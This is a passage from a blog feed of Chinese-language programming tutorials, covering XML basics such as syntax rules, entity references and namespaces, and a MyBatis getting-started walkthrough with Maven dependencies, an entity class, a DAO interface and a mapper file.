class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">MybatisStudyDao dao = sqlsession.getMapper(MybatisStudyDao.class);<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>使用 dao 接口的方法，调用方法就执行了 mapper 文件中的 SQL 语句。</li></ol></blockquote><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">List<span class="hljs-tag">&lt;<span class="hljs-name">USER</span>&gt;</span> list = dao.alluser();<br></code></pre></div></td></tr></table></figure><h2 id="4-3-要求"><a href="#4-3-要求" class="headerlink" title="4.3 要求"></a>4.3 要求</h2><blockquote><ol><li>dao 接口和 mapper 文件放在一起，同一目录下。</li></ol></blockquote><blockquote><ol start="2"><li>dao 接口和 mapper 文件名称一致。</li></ol></blockquote><blockquote><ol start="3"><li>mapper 文件中的 namespace 的值是 dao 接口的全限定名称。 </li></ol></blockquote><blockquote><ol start="4"><li>mapper 文件中的 &lt;select&gt;、&lt;insert&gt;、&lt;update&gt;、&lt;delete&gt; 等的 id 是接口中方法的名称。</li></ol></blockquote><blockquote><ol start="5"><li>dao 接口中不要使用重载方法，不要使用同名的、不同参数的方法。</li></ol></blockquote>]]></content>
    
    
    <categories>
      
      <category>MyBatis学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（三）Xml简单入门</title>
    <link href="/2021/06/13/JavaWEB/JavaWEB-%EF%BC%88%E4%B8%89%EF%BC%89Xml%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/"/>
    <url>/2021/06/13/JavaWEB/JavaWEB-%EF%BC%88%E4%B8%89%EF%BC%89Xml%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p>XML 指可扩展标记语言（EXtensible Markup Language），是一种标记语言，很类似 HTML。XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。XML 没什么特别的。它仅仅是纯文本而已。有能力处理纯文本的软件都可以处理 XML。通过 XML 可以发明自己的标签。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-认识XML"><a href="#1-认识XML" class="headerlink" title="1.认识XML"></a>1.认识XML</h2><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>George<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>John<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>第一行是 XML 声明。它定义 XML 的版本 (1.0) 和所使用的编码。XML 文档必须包含根元素（如：note），该元素是所有其他元素的父元素。</p><h2 id="2-语法规则"><a href="#2-语法规则" class="headerlink" title="2.语法规则"></a>2.语法规则</h2><h3 id="2-1-标签"><a href="#2-1-标签" class="headerlink" title="2.1 标签"></a>2.1 标签</h3><p>所有 XML 元素都须有关闭标签。在 XML 中，省略关闭标签是非法的。所有元素都必须有关闭标签。</p><h3 id="2-2-大小写"><a href="#2-2-大小写" class="headerlink" title="2.2 大小写"></a>2.2 大小写</h3><p>XML 标签对大小写敏感。在 XML 中，标签 &lt;Letter&gt; 与标签 &lt;letter&gt; 是不同的。必须使用相同的大小写来编写打开标签和关闭标签。</p><h3 id="2-3-嵌套"><a href="#2-3-嵌套" class="headerlink" title="2.3 嵌套"></a>2.3 嵌套</h3><p>XML 必须正确地嵌套。</p><h3 id="2-4-根元素"><a href="#2-4-根元素" class="headerlink" title="2.4 根元素"></a>2.4 根元素</h3><p>XML 文档必须有一个元素是所有其他元素的父元素。该元素称为根元素。</p><h3 id="2-5-属性值"><a href="#2-5-属性值" class="headerlink" title="2.5 属性值"></a>2.5 属性值</h3><p>在 XML 中，XML 的属性值须加引号，单引号和双引号均可使用。</p><h3 id="2-6-实体引用"><a href="#2-6-实体引用" class="headerlink" title="2.6 实体引用"></a>2.6 实体引用</h3><table><thead><tr><th align="center">表示</th><th align="center">符号</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">&amp;lt;</td><td align="center">&lt;</td><td align="center">小于</td></tr><tr><td align="center">&amp;gt;</td><td align="center">&gt;</td><td align="center">大于</td></tr><tr><td align="center">&amp;amp;</td><td align="center">&amp;</td><td align="center">和号</td></tr><tr><td align="center">&amp;apos;</td><td align="center">‘</td><td align="center">单引号</td></tr><tr><td align="center">&amp;quot;</td><td align="center">“</td><td align="center">引号</td></tr></tbody></table><p><strong>注释：</strong>在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p><h3 id="2-7-注释"><a href="#2-7-注释" class="headerlink" title="2.7 注释"></a>2.7 注释</h3><p>在 XML 中编写注释的语法与 HTML 的语法很相似。</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--这是注释--&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="3-命名空间"><a href="#3-命名空间" class="headerlink" title="3.命名空间"></a>3.命名空间</h2><p>XML 命名空间提供避免元素命名冲突的方法。当两个不同的文档使用相同的元素名时，就会发生命名冲突。如：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">//文件一<br><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Apples<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Bananas<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><br>//文件二<br><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>African Coffee Table<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">width</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">width</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">length</span>&gt;</span>120<span class="hljs-tag">&lt;/<span class="hljs-name">length</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>假如这两个 XML 文档被一起使用，由于两个文档都包含带有不同内容和定义的 &lt;table&gt; 元素，就会发生命名冲突。</p><h3 id="3-1-使用前缀来避免命名冲突"><a href="#3-1-使用前缀来避免命名冲突" class="headerlink" title="3.1 使用前缀来避免命名冲突"></a>3.1 使用前缀来避免命名冲突</h3><p>示例：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">文件一<br><span class="hljs-tag">&lt;<span class="hljs-name">h:table</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">h:tr</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">h:td</span>&gt;</span>Apples<span class="hljs-tag">&lt;/<span class="hljs-name">h:td</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">h:td</span>&gt;</span>Bananas<span class="hljs-tag">&lt;/<span class="hljs-name">h:td</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">h:tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">h:table</span>&gt;</span><br>文件二<br><span class="hljs-tag">&lt;<span class="hljs-name">f:table</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">f:name</span>&gt;</span>African Coffee Table<span class="hljs-tag">&lt;/<span class="hljs-name">f:name</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">f:width</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">f:width</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">f:length</span>&gt;</span>120<span class="hljs-tag">&lt;/<span class="hljs-name">f:length</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">f:table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>现在，命名冲突不存在了，这是由于两个文档都使用了不同的名称来命名它们的 &lt;table&gt; 元素 (&lt;h:table&gt; 和 &lt;f:table&gt;)。通过使用前缀，我们创建了两种不同类型的 &lt;table&gt; 元素。</p><h3 id="3-2-使用命名空间（Namespaces）"><a href="#3-2-使用命名空间（Namespaces）" class="headerlink" title="3.2 使用命名空间（Namespaces）"></a>3.2 使用命名空间（Namespaces）</h3><p>示例：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">文件一<br><span class="hljs-tag">&lt;<span class="hljs-name">h:table</span> <span class="hljs-attr">xmlns:h</span>=<span class="hljs-string">&quot;http://www.w3.org/TR/html4/&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">h:tr</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">h:td</span>&gt;</span>Apples<span class="hljs-tag">&lt;/<span class="hljs-name">h:td</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">h:td</span>&gt;</span>Bananas<span class="hljs-tag">&lt;/<span class="hljs-name">h:td</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">h:tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">h:table</span>&gt;</span><br>文件二<br><span class="hljs-tag">&lt;<span class="hljs-name">f:table</span> <span class="hljs-attr">xmlns:f</span>=<span class="hljs-string">&quot;http://www.w3school.com.cn/furniture&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">f:name</span>&gt;</span>African Coffee Table<span class="hljs-tag">&lt;/<span class="hljs-name">f:name</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">f:width</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">f:width</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">f:length</span>&gt;</span>120<span class="hljs-tag">&lt;/<span class="hljs-name">f:length</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">f:table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>与仅仅使用前缀不同，我们为 &lt;table&gt; 标签添加了一个 xmlns 属性，这样就为前缀赋予了一个与某个命名空间相关联的限定名称。</p><h3 id="3-3-XML-Namespace-xmlns-属性"><a href="#3-3-XML-Namespace-xmlns-属性" class="headerlink" title="3.3 XML Namespace (xmlns) 属性"></a>3.3 XML Namespace (xmlns) 属性</h3><p>XML 命名空间属性被放置于元素的开始标签之中，语法如下：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">xmlns:namespace-prefix=&quot;namespaceURI&quot;<br></code></pre></div></td></tr></table></figure><p>当命名空间被定义在元素的开始标签中时，所有带有相同前缀的子元素都会与同一个命名空间相关联。用于标示命名空间的地址不会被解析器用于查找信息。其惟一的作用是赋予命名空间一个惟一的名称。不过，很多公司常常会作为指针来使用命名空间指向实际存在的网页，这个网页包含关于命名空间的信息。</p><h3 id="3-4-统一资源标识符（URL）"><a href="#3-4-统一资源标识符（URL）" class="headerlink" title="3.4 统一资源标识符（URL）"></a>3.4 统一资源标识符（URL）</h3><p>统一资源标识符是一串可以标识因特网资源的字符。最常用的 URI 是用来标示因特网域名地址的统一资源定位器(URL)。另一个不那么常用的 URI 是统一资源命名(URN)。</p><h3 id="3-5-默认的命名空间"><a href="#3-5-默认的命名空间" class="headerlink" title="3.5 默认的命名空间"></a>3.5 默认的命名空间</h3><p>为元素定义默认的命名空间可以让我们省去在所有的子元素中使用前缀的工作。<br>示例：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">//示例一<br><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/TR/html4/&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Apples<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Bananas<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br>//示例二<br><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3school.com.cn/furniture&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>African Coffee Table<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">width</span>&gt;</span>80<span class="hljs-tag">&lt;/<span class="hljs-name">width</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">length</span>&gt;</span>120<span class="hljs-tag">&lt;/<span class="hljs-name">length</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MyBatis学习-（一）MyBatis入门例子</title>
    <link href="/2021/06/13/MyBatis%E5%AD%A6%E4%B9%A0/MyBatis%E5%AD%A6%E4%B9%A0-%EF%BC%88%E4%B8%80%EF%BC%89MyBatis%E5%85%A5%E9%97%A8%E4%BE%8B%E5%AD%90/"/>
    <url>/2021/06/13/MyBatis%E5%AD%A6%E4%B9%A0/MyBatis%E5%AD%A6%E4%B9%A0-%EF%BC%88%E4%B8%80%EF%BC%89MyBatis%E5%85%A5%E9%97%A8%E4%BE%8B%E5%AD%90/</url>
    
    <content type="html"><![CDATA[<p>MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>MyBatis 中文文档：<a href="https://mybatis.org/mybatis-3/zh/index.html">https://mybatis.org/mybatis-3/zh/index.html</a></p><h2 id="1-创建项目"><a href="#1-创建项目" class="headerlink" title="1.创建项目"></a>1.创建项目</h2><blockquote><ol><li>首先建一个空工程（Empty Project）。</li></ol></blockquote><blockquote><ol start="2"><li>新建一个 Module ，选择 Maven（快速创建 <code>org.apache.maven.archetypes:maven-archetype-quickstart</code>）。</li></ol></blockquote><blockquote><ol start="3"><li>在 main 下新建一个 <code>resources</code> 文件。（右键 main  选择 <code>new -&gt; Directory</code>，创建（选择）resources 即可）。如果创建后图标只是一个单纯的文件夹（没有其他东西），右键该文件夹，选择 <code>Mark Directory as -&gt; Resources Root</code> 。（注意：如果是 Test Resources Root 则不需要点。如果点了后，再按照同样的步骤点一遍即可。）</li></ol></blockquote><blockquote><ol start="4"><li>整理 <code>pom.xml</code>文件</li></ol></blockquote><ul><li><p>可以将文件中以下代码删除不要。</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Temp<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-comment">&lt;!-- FIXME change it to the project&#x27;s website --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://www.example.com<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br></code></pre></div></td></tr></table></figure></li><li><p>修改</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br></code></pre></div></td></tr></table></figure></li><li><p>删除或注释掉<code>build</code>里面的内容，现在不需要。注意：只是删除或注释<code>build</code>里面的内容，而不包含<code>build</code>。</p></li></ul><h2 id="2-添加依赖"><a href="#2-添加依赖" class="headerlink" title="2.添加依赖"></a>2.添加依赖</h2><p>打开 <code>pom.xml</code>文件。在 <code>dependencies</code>中添加依赖。</p><h3 id="2-1-MyBatis-依赖"><a href="#2-1-MyBatis-依赖" class="headerlink" title="2.1 MyBatis 依赖"></a>2.1 MyBatis 依赖</h3><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>报错先不要急！</strong></p><h3 id="2-2-MySQL-驱动"><a href="#2-2-MySQL-驱动" class="headerlink" title="2.2 MySQL 驱动"></a>2.2 MySQL 驱动</h3><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.9<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure><ul><li>处理<blockquote><p>右键 <code>pom.xml</code>文件，选择 <code>Maven</code>-&gt; <code>Reload project（刷新图标）</code>。</p></blockquote></li></ul><p>在右侧的 Maven 中可以看见添加的依赖。</p><h2 id="3-创建实体类"><a href="#3-创建实体类" class="headerlink" title="3.创建实体类"></a>3.创建实体类</h2><p>在 main 中（src/main/java/com/loong/test） 下创建 USER 实体类。要求属性与列名一样。快速创建get 、 set 和 toString()方法 <code>Alt + Insert</code>。</p><p>USER.class</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.loong.test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">USER</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Integer id;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> String tele;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Integer <span class="hljs-title">getId</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setId</span><span class="hljs-params">(Integer id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getTele</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> tele;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setTele</span><span class="hljs-params">(String tele)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.tele = tele;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;USER&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;id=&quot;</span> + id +<br>                <span class="hljs-string">&quot;, username=&#x27;&quot;</span> + username + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, tele=&#x27;&quot;</span> + tele + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="4-创建DAO接口"><a href="#4-创建DAO接口" class="headerlink" title="4.创建DAO接口"></a>4.创建DAO接口</h2><p>在 main 中（src/main/java/com/loong/dao）下 创建 MybatisStudyDao<code>接口</code>。</p><p>USERDao</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//查询表的所有数据</span><br><span class="hljs-keyword">package</span> com.loong.Dao;<br><br><span class="hljs-keyword">import</span> com.loong.test.USER;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">MybatisStudyDao</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;USER&gt; <span class="hljs-title">alluser</span><span class="hljs-params">()</span></span>;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="5-SQL映射文件"><a href="#5-SQL映射文件" class="headerlink" title="5.SQL映射文件"></a>5.SQL映射文件</h2><p>**需要放在与接口同一目录下，即 src/main/java/com/loong/dao 目录下。文件名称与接口名称一样。 **</p><p>创建 <code>MybatisStudyDao.xml</code> 文件。</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.loong.Dao.MybatisStudyDao&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--    &lt;select id=&quot;selectBlog&quot; resultType=&quot;Blog&quot;&gt;--&gt;</span><br><span class="hljs-comment">&lt;!--        select * from Blog where id = #&#123;id&#125;--&gt;</span><br><span class="hljs-comment">&lt;!--    &lt;/select&gt;--&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span 